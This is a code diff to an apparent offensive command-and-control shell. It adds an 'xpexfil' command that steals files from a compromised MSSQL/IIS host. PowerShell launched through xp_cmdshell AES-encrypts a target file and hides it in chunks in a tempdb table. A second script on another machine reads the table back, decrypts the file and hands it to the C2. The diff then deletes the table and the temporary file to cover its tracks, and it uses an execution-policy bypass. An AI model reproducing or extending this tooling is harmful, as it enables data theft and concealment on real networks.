@@ -19,6 +19,7 @@ Built-in commands (case-insensitive):
     xpshell cmd <cmd>               run cmd.exe command on MSSQL host via xp_cmdshell
     xpshell psh <ps_script>         stage and run PowerShell script on MSSQL host
     xpstage <payload> [--no-encrypt]        stage binary to MSSQL host via DB channel
+    xpexfil <remote_path> <local_name>  exfil a file from MSSQL host to C2 via DB channel (AES-256-CBC + base64)
     help                            show this help
     exit / quit                     exit the shell
 
@@ -211,7 +212,12 @@ class XpMssql:
             "$rd=$cm.ExecuteReader();$sb=New-Object System.Text.StringBuilder;"
             "while($rd.Read()){$sb.Append($rd.GetString(0))|Out-Null};"
             "$rd.Close();$cn.Close();"
-            "$b=[Convert]::FromBase64String($sb.ToString());"
+            "$raw=[System.Text.Encoding]::ASCII.GetBytes($sb.ToString());"
+            "$t=New-Object System.Security.Cryptography.FromBase64Transform;"
+            "$ms=New-Object System.IO.MemoryStream;"
+            "$cs=New-Object System.Security.Cryptography.CryptoStream($ms,$t,[System.Security.Cryptography.CryptoStreamMode]::Write);"
+            "$cs.Write($raw,0,$raw.Length);$cs.FlushFinalBlock();"
+            "$b=$ms.ToArray();"
             "$a=[System.Security.Cryptography.Aes]::Create();"
             "$a.Mode='CBC';$a.Padding='PKCS7';$a.Key=$k;$a.IV=$b[0..15];"
             "$ct=$b[16..($b.Length-1)];"
@@ -229,9 +235,97 @@ class XpMssql:
             "$rd=$cm.ExecuteReader();$sb=New-Object System.Text.StringBuilder;"
             "while($rd.Read()){$sb.Append($rd.GetString(0))|Out-Null};"
             "$rd.Close();$cn.Close();"
-            "$b=[Convert]::FromBase64String($sb.ToString());"
+            "$raw=[System.Text.Encoding]::ASCII.GetBytes($sb.ToString());"
+            "$t=New-Object System.Security.Cryptography.FromBase64Transform;"
+            "$ms=New-Object System.IO.MemoryStream;"
+            "$cs=New-Object System.Security.Cryptography.CryptoStream($ms,$t,[System.Security.Cryptography.CryptoStreamMode]::Write);"
+            "$cs.Write($raw,0,$raw.Length);$cs.FlushFinalBlock();"
+            "$b=$ms.ToArray();"
             f"[IO.File]::WriteAllBytes('{out_path}',$b)"
         )
+
+    def _build_exfil_insert_ps(self, remote_path: str, key_b64: str) -> str:
+        """PowerShell run on IIS01 via cmd_xpshell_psh: AES-encrypt file + INSERT into tempdb..exfil."""
+        connstr = (f"Server={self._host.replace(':', ',')};"
+                   f"Database=tempdb;User ID={self._login};Password={self._password};"
+                   f"TrustServerCertificate=True")
+        return (
+            f"$raw=[IO.File]::ReadAllBytes('{remote_path}');"
+            f"$k=[Convert]::FromBase64String('{key_b64}');"
+            "$a=[System.Security.Cryptography.Aes]::Create();"
+            "$a.Mode='CBC';$a.Padding='PKCS7';$a.Key=$k;$a.GenerateIV();"
+            "$enc=$a.CreateEncryptor().TransformFinalBlock($raw,0,$raw.Length);"
+            "$blob=[byte[]]($a.IV)+$enc;"
+            "$t2=New-Object System.Security.Cryptography.ToBase64Transform;"
+            "$ms2=New-Object System.IO.MemoryStream;"
+            "$cs2=New-Object System.Security.Cryptography.CryptoStream($ms2,$t2,[System.Security.Cryptography.CryptoStreamMode]::Write);"
+            "$cs2.Write($blob,0,$blob.Length);$cs2.FlushFinalBlock();"
+            "$b64=[System.Text.Encoding]::ASCII.GetString($ms2.ToArray());"
+            f"$cn=New-Object System.Data.SqlClient.SqlConnection('{connstr}');"
+            "$cn.Open();$cm=$cn.CreateCommand();"
+            "$cm.CommandText=\"IF OBJECT_ID('tempdb..exfil','U') IS NOT NULL DROP TABLE tempdb..exfil;"
+            "CREATE TABLE tempdb..exfil(id INT IDENTITY(1,1),chunk NVARCHAR(MAX));GRANT SELECT ON exfil TO PUBLIC;\";"
+            "$cm.ExecuteNonQuery()|Out-Null;"
+            "$cs=8000;$n=[Math]::Ceiling($b64.Length/$cs);"
+            "for($i=0;$i -lt $n;$i++){"
+            "  $chunk=$b64.Substring($i*$cs,[Math]::Min($cs,$b64.Length-$i*$cs));"
+            "  $cm2=$cn.CreateCommand();"
+            "  $cm2.CommandText=\"INSERT INTO tempdb..exfil(chunk) VALUES (N'$($chunk.Replace(\"'\",\"''\"))'\"+')';"
+            "  $cm2.ExecuteNonQuery()|Out-Null"
+            "};"
+            "$cn.Close();"
+            "Write-Output 'exfil INSERT done'"
+        )
+
+    def _build_exfil_extract_ps(self, local_path: str, key_b64: str) -> str:
+        """PowerShell run on WS01 via cmd_exec_raw: read tempdb..exfil, decode, decrypt, write file."""
+        connstr = (f"Server={self._host.replace(':', ',')};"
+                   f"Database=tempdb;User ID={self._login};Password={self._password};"
+                   f"TrustServerCertificate=True")
+        return (
+            f"$cn=New-Object System.Data.SqlClient.SqlConnection('{connstr}');"
+            "$cn.Open();$cm=$cn.CreateCommand();"
+            "$cm.CommandText='SELECT chunk FROM tempdb..exfil ORDER BY id';"
+            "$rd=$cm.ExecuteReader();$sb=New-Object System.Text.StringBuilder;"
+            "while($rd.Read()){$sb.Append($rd.GetString(0))|Out-Null};"
+            "$rd.Close();$cn.Close();"
+            "$raw=[System.Text.Encoding]::ASCII.GetBytes($sb.ToString());"
+            "$t=New-Object System.Security.Cryptography.FromBase64Transform;"
+            "$ms=New-Object System.IO.MemoryStream;"
+            "$cs=New-Object System.Security.Cryptography.CryptoStream($ms,$t,[System.Security.Cryptography.CryptoStreamMode]::Write);"
+            "$cs.Write($raw,0,$raw.Length);$cs.FlushFinalBlock();"
+            "$blob=$ms.ToArray();"
+            f"$k=[Convert]::FromBase64String('{key_b64}');"
+            "$a=[System.Security.Cryptography.Aes]::Create();"
+            "$a.Mode='CBC';$a.Padding='PKCS7';$a.Key=$k;$a.IV=$blob[0..15];"
+            "$ct=$blob[16..($blob.Length-1)];"
+            "$dec=$a.CreateDecryptor().TransformFinalBlock($ct,0,$ct.Length);"
+            f"[IO.File]::WriteAllBytes('{local_path}',$dec)"
+        )
+
+    def cmd_xpexfil(self, shell, remote_path: str, local_name: str):
+        """Exfil a file from IIS01 to controlServer via MSSQL DB channel (AES-256-CBC + base64)."""
+        import os
+        import base64 as _b64
+        key_b64   = _b64.b64encode(os.urandom(32)).decode()
+        local_tmp = f"C:\\Windows\\Temp\\{local_name}"
+
+        print("[*] xpexfil: encrypting and inserting into tempdb..exfil ...")
+        self.cmd_xpshell_psh(shell, self._build_exfil_insert_ps(remote_path, key_b64))
+
+        print("[*] xpexfil: extracting to WS01 ...")
+        extract_ps = self._build_exfil_extract_ps(local_tmp, key_b64)
+        shell.cmd_exec_raw(f'powershell -NoProfile -ExecutionPolicy Bypass -Command "{extract_ps}"')
+
+        print(f"[*] xpexfil: pulling {local_name} from WS01 ...")
+        shell.cmd_get(local_tmp)
+
+        self._exec_q(shell,
+            "EXECUTE AS LOGIN='sa';"
+            "IF OBJECT_ID('tempdb..exfil','U') IS NOT NULL DROP TABLE tempdb..exfil;"
+        )
+        shell.cmd_exec_raw(f"cmd /c del /f {local_tmp}")
+        print(f"[+] xpexfil done → {local_name}")
 
 
 class ToneShellShell:
@@ -493,6 +587,16 @@ class ToneShellShell:
                     else:
                         no_enc = len(parts) >= 3 and parts[2] == "--no-encrypt"
                         self._xp.cmd_xpstage(self, parts[1], encrypt=not no_enc)
+
+                elif cmd == "xpexfil":
+                    if not self.session:
+                        print("[!] not attached to a session")
+                    elif len(parts) < 3:
+                        print("usage: xpexfil <remote_path> <local_name>")
+                    elif not self._xp.ready():
+                        print("[!] run xpinit first")
+                    else:
+                        self._xp.cmd_xpexfil(self, parts[1], parts[2])
 
                 else:
                     if not self.session:
